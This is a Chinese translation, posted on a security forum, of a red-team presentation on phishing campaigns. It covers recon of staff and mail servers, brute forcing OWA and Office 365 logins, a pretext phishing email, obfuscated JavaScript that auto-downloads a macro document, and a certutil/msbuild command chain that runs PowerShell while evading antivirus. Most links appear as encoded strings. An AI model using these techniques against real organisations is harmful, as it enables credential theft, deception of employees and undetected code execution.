
<mark class="encrypted">055K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3y4G2k6X3k6W2k6h3S2T1i4K6u0W2j5$3&6Q4x3V1k6Q4x3@1k6A6k6q4)9K6c8o6p5H3x3R3`.`.</mark>

**作者：Charles F. Hamilton**

### 0、记录

内容由《A-Journey-Into-a-RedTeam-2018.pdf》这篇PPT所翻译而来。

PPT讲解点如下：

- 0x1 红队测试的意义
- 0x2 识别目标
- 0x3 钓鱼式攻击
- 0x4 创建有效载荷
- 0x5 狩猎
- 0x6 工具和技巧

### 1、红队测试的意义

- 0x1 评估客户对威胁行为的反应能力
- 0x2 通过实现预演（访问CEO电子邮件、访问客户数据等）来评估客户网络的安全态势。
- 0x3 演示攻击者访问客户端资产的潜在路径

### 2、识别目标

假设主要攻击方向是钓鱼式攻击，那么需要做好以下几点准备：

- 创建目标列表
- 识别安全产品
- 选择钓鱼式攻击的主题

#### 2.1 图片上的蛛丝马迹

Facebook提供的图片会有一些员工姓名信息

![](https://bbs.kanxue.com/upload/attach/201806/214974_PYWPXBJZ5TS4KCU.png)

搜索与目标电子邮件地址相关的公开密码库、搜索github，pastebin等。如果攻击者足够幸运的话，甚至可以获取密码。OWA和Office 365都是很有价值的服务应用。

#### 2.2 OWA的预置模式

- 泄漏的GAL:

```
b47K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6&6L8%4g2J5i4K6u0W2N6r3q4J5k6$3g2@1i4K6u0r3L8%4N6S2i4K6u0r3M7$3g2J5N6X3W2U0k6g2)9J5k6i4y4$3j5#2)9K6c8X3q4U0N6r3W2G2L8W2)9K6c8p5N6W2N6q4m8W2L8%4m8D9k6f1k6A6L8s2c8W2M7Y4x3`.
```

- 没有MFA的情况下，暴力破解密码+读，写电子邮件。：

```
31eK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6&6L8%4g2J5i4K6u0W2N6r3q4J5k6$3g2@1i4K6u0r3c8g2N6e0i4K6u0r3c8i4S2U0K9r3q4F1k6$3g2Q4x3X3g2S2M7$3#2^5
```

**注：**MFA(Multi-factor authentication,多因素认证)

d8cK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2S2L8r3W2T1j5h3u0S2j5$3I4G2N6h3c8Q4x3X3g2U0L8$3#2Q4x3V1k6Z5k6h3I4H3i4K6u0r3P5X3S2Q4x3V1k6V1L8$3y4Q4x3X3c8V1k6i4c8S2K9h3I4Q4x3V1j5J5z5o6j5K6y4g2)9J5k6h3S2@1L8g2)9K6c8Y4y4H3L8g2)9K6c8r3p5J5j5K6j5K6i4K6u0W2M7o6x3^5x3K6f1$3i4K6u0W2j5e0y4Q4x3X3f1K6i4K6u0W2z5h3y4W2y4o6b7&6x3h3y4D9y4#2W2i4M7r3f1`.

#### 2.3 云端的Office365

- 读写电子邮件：

```
d95K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6G2N6i4c8D9L8$3!0C8i4K6u0W2L8$3k6X3K9h3y4W2x3K6j5#2i4K6u0W2j5$3!0E0i4K6u0r3j5i4m8A6i4K6u0r3N6U0q4Q4x3X3f1H3i4K6u0r3
```

- 暴力破解密码：

```
f8bK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6S2N6i4c8G2k6r3W2K6j5$3!0$3k6i4u0Q4x3X3c8K6i4K6u0W2L8%4g2@1L8r3!0G2K9#2)9J5k6h3y4G2L8g2)9J5c8X3q4#2N6r3!0V1K9i4y4U0L8%4k6W2M7W2)9J5c8X3q4#2N6r3!0V1K9i4y4U0L8%4k6W2M7W2)9J5k6i4S2E0L8l9`.`.
```

#### 2.4 利用shadon

通过Shodan寻找受攻击目标公共IP范围的以下几类服务：

- Citrix portals
- OWA
- VPN
- 任何可以远程认证的服务

针对这些服务使用暴力破解，因为这些远程认证服务可能没有强制2FA认证。打个比方，至少有一个账户会存在“Summer2018”这个密码。

**注：** 2FA,2 Factor Authentication,双因子验证,是一种安全密码验证方式。

#### 2.5 发送电子邮件到一个不存在的帐户，等待返回错误信息

![](https://bbs.kanxue.com/upload/attach/201806/214974_VEYUCE89UQNR7C7.png)

通过错误邮件返回的邮件信息可以判断对方邮件服务器当前使用的安全软件，配置的安全策略等。

#### 2.6 通过邮件搜索社交网站，比如LinkedIn

![](https://bbs.kanxue.com/upload/attach/201806/214974_VMRM96DDKNCGD99.png)

**注：**也可以是任意的社交招聘类网站平台

#### 2.7 通过目标的企业网站获取网络钓鱼攻击的主题

通过以下两类事件指定网络钓鱼攻击的主题。

- 判断目标有忠诚度计划吗？
- 即将出现的特殊事件 ？

### 3、钓鱼式攻击

- 规则0x1：不要把恶意的有效Payload放入电子邮件
- 规则0x2：不要让自动化解决方案发觉到攻击者最后阶段的行为
- 规则0x3：使用分类域名
- 规则0x4：使用HTTPS
- 规则0x5：钓鱼主题-尽可能的无聊
- 规则0x6：避免使用拼写错误的域名
- 规则0x7：不要重复使用同样的域名

#### 3.1 不要把恶意的Payload放入电子邮件

通常攻击者发送的钓鱼邮件中链接会指向攻击者自己控制的服务器，因为受到受到攻击的目标可能会有安全产品识别出攻击者的Payload追查攻击者的痕迹。

采用以上的方式如果Payload出了问题，攻击者可以立即改变Payload。

![](https://bbs.kanxue.com/upload/attach/201806/214974_KBQQF662VXDHY88.png)

```
嗨，鲍伯，



我们目前正在更新我们的行为守则。



请尽快审查和接受。



行为准则可以在这里找到：



61fK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6H3K9r3W2K6K9s2W2Q4x3X3g2V1L8$3#2S2K9h3&6Q4x3V1k6U0L8$3#2H3j5h3&6&6i4K6u0r3j5$3!0V1k6g2)9J5c8X3p5J5k6h3j5K6y4U0u0W2i4K6u0V1y4o6g2V1x3q4)9J5k6r3t1J5x3h3c8Q4x3X3b7#2j5h3u0X3i4K6u0V1k6h3c8U0k6e0t1&6k6o6x3$3y4h3y4T1



谢谢您，人力资源总监 查尔斯
```

##### Apache mod_rewrite规则可以生成具有唯一ID的公司URL

```
RewriteEngine On

RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.*)$ index.php [L,QSA]
```

效果如下：

- 钓鱼URL：973K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6H3K9r3W2K6K9s2W2Q4x3X3g2V1L8$3#2S2K9h3&6Q4x3V1k6U0L8$3#2H3j5h3&6&6i4K6u0r3j5$3!0V1k6g2)9J5c8X3p5J5k6h3j5K6y4U0u0W2i4K6u0V1y4o6g2V1x3q4)9J5k6r3t1J5x3h3c8Q4x3X3b7#2j5h3u0X3i4K6u0V1k6h3c8U0k6e0t1&6k6o6x3$3y4h3y4T1i4K6u0r3
- 实际访问：d29K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6H3K9r3W2K6K9s2W2Q4x3X3g2V1L8$3#2S2K9h3&6Q4x3V1k6U0L8$3#2H3j5h3&6&6i4K6u0r3K9h3&6V1k6i4S2Q4x3X3g2H3K9s2l9`.

注：给每一个测试的Payload一个标识便于区分被钓鱼的对象

#### 3.2 不要让自动化解决方案发觉到攻击者最后阶段的行为

如Word doc, ClickOnce等，如何使用JavaScript生成有效载荷的最终链接呢？

让我们假设钓鱼网站上的HTML看起来是这样的：

```
<a href="https://phishy.domain/payload.docm">

download the code of conduct

</a>
```

自动化安全工具可以很容易处理HTML并调试Payload进行进一步的分析。

但是如果使用JavaScript生成最终的链接像下面这样：

```
<a id="download" href="#">

download the code of conduct

</a>

<script>
document.getElementById("download").onclick= function() {
document.location= "https://phish" + "y.domain/pay" + "load.docm";
};
document.getElementById("download").click();
</script>
```

以上例子href是立即访问的，点开页面访问会跳转到【6e1K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6H3K9r3W2K6K9s2W2Q4x3X3g2V1L8$3#2S2K9h3&6Q4x3V1k6H3j5i4W2D9L8$3q4V1i4K6u0W2k6r3!0U0L8g2!0q4x3#2)9^5x3q4)9&6x3g2!0q4z5q4!0n7c8W2)9&6z5g2!0q4y4q4!0n7z5q4!0m8b7g2!0q4y4g2)9&6b7#2!0n7x3q4!0q4y4g2)9&6c8q4)9^5x3q4!0q4x3#2)9^5x3q4)9^5x3R3`.`.

网络钓鱼成功率与用户体验有很大关系。强制用户点击click()下载文件，浏览器会提示下载窗口。

#### 3.3 使用分类域名

在评估之前，简单地克隆一个合法网站。最好是安全产品已经分类好的信任域名。

```
#!/bin/bash
echo "Cloning $1"
wget $1 -O index.html &> /dev/null
TAG="<base href=\"$1\"/></head>"
sed '/<\/head>/i\'"$TAG" index.html | tee index.html &> /dev/null
echo "index.html was saved and modified"
```

**注：**代码内容为643K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4y4@1i4K6u0W2k6$3W2@1K9s2g2T1i4K6u0W2j5$3!0E0i4K6u0r3e0i4u0Q4x3X3c8g2L8U0q4C8x3r3b7K6M7W2)9J5c8U0p5I4j5X3j5&6x3o6t1#2y4e0g2V1y4o6l9I4j5K6V1J5j5K6u0W2x3h3t1%4y4U0j5J5y4K6g2W2y4X3p5J5

搜索已被分类的过期域；这可能是有用的，也是最简单的分类域的方式。

```
CatMyFishV1.0-搜索已经分类可用的域名 
022K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6y4M7W2)9J5k6q4g2F1x3h3D9H3k6o6y4J5i4K6u0r3b7$3q4@1e0i4W2r3K9i4y4Z5
```

#### 3.4 使用HTTPS

使用免费的HTTPS证书，搭建网站。

优点就在于不必验证攻击者的身份，也可以达到混淆受害者判断力的目的。

#### 3.5 钓鱼主题-尽可能的无聊

如果选用太好的钓鱼式题材，就不太可能像真的。

用无聊的钓鱼式主题，如：内部行为守则更新、强制骚扰在线课程、员工问卷调查等等，这些倾向类比较强的主题可以较少引起怀疑。

#### 3.6 避免使用拼写错误的域名

```
northsex.io   VS   northsec.canadianevent.com
```

作为第三方服务公司的一部分，使用子域往往会提供更好的结果，因为人们现在每天都使用云服务。

前者的钓鱼域名就是将真正域名的northsec改变了一个字母以此来迷惑用户。

其实这个对于安全意识越来越高的现代人来说，很容易就对前者产生了怀疑。

但是现在的服务越来越多样化，很多公司都会有第三方服务，这些第三方服务通常会带上目标公司的域名做前缀。

#### 3.7 不要重复使用同样的域名

因为攻击者永远不知道自己的Payload会在哪里运行起来(如virustotal等)。如果反复使用同一个域名，则可能泄漏其他客户端的信息。

### 4、创建有效载荷

避免检测的经典方法是在安全产品上执行不同的操作-安全产品通常通过一些指纹识别来防止恶意有效载荷的执行。

能够绕过所有安全层的攻击者将能够在目标系统上执行代码而不被检测到。

但是端点解决方案的方式是“沙盒”呢？

混淆与规避的定义 ：

```
$a = 3;           // 原始代码
$a = 1 + 2;       // 混淆代码
if(context == “sandbox”) {
     $a = 3;
 } else { exit() }// 规避
```

流行的事物不一定是好事情，安全厂商通常会努力阻止最新的技巧，尤其是现在每个人都使用PowerShell。

- 规则0x1：不要直接运行PowerShell

为此作者写了一个工具：PowerLessShell,实现了不调用powershell.exe的情况下执行PowserShell命令；

e1cK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6y4M7W2)9J5k6q4g2F1x3h3D9H3k6o6y4J5i4K6u0r3f1r3!0%4k6i4u0x3k6i4y4K6f1$3S2W2L8r3H3`.

PowerLessShell依赖MsBuild.exe远程执行PowerShell脚本和命令而不生成PowerShell.exe。也可以使用相同的方法执行原始的ShellCode。

**注：**工具原理通过笔者分析实践，此工具生成的脚本必须要在管理员权限下运行。核心代码如下：

```
# 将PowerShell脚本转成了十六进制，利用Certutil自带转码功能恢复原样。再使用MsBuild.exe执行，使用完毕后清除生成的文件。

certutil -decodehex vpmMLfdAbV dWCBVaaSqezNvPbCKpFyJiwG   && copy msbuild.exe QrjZkfusnfnbvOoGuqq.exe   && QrjZkfusnfnbvOoGuqq.exe dWCBVaaSqezNvPbCKpFyJiwG   && del QrjZkfusnfnbvOoGuqq.exe   && del dWCBVaaSqezNvPbCKpFyJiwG   && del vpmMLfdAbV
```

- 规则0x2：如果使用宏来执行命令，避免使用WScript.Shell 和 Shell()，因为大多数安全产品会跟踪WINWORD.EXE触发生成的子进程。目前最佳的方式是使用WMI来执行Payload；

057K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6y4M7W2)9J5k6q4g2F1x3h3D9H3k6o6y4J5i4K6u0r3e0h3q4D9K9h3y4A6L8%4g2K6e0h3q4U0M7X3!0s2k6h3&6W2M7X3q4@1L8%4t1`.

**注：** 工具原理通过笔者分析，核心代码如下：

![](https://bbs.kanxue.com/upload/attach/201806/214974_TF6GRSHXWBRQEY2.png)

调用的函数名和对象名进行了字符混淆，使用Wmi调用cmd.exe再调用PowerShell执行命令。

如果计划使用已签名的Windows二进制文件，许多安全厂商将它们列入黑名单：

- regsvr32.exe
- msbuild.exe
  …

以下工具可以修改二进制文件的HASH，同时保留微软的签名:

0b8K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6y4M7W2)9J5k6q4g2F1x3h3D9H3k6o6y4J5i4K6u0r3g2$3W2F1k6r3!0%4M7#2)9J5k6q4y4A6k6$3&6W2k6p5u0A6L8X3q4J5P5b7`.`.

还可以尝试执行二进制文件重命名的击败某些产品：
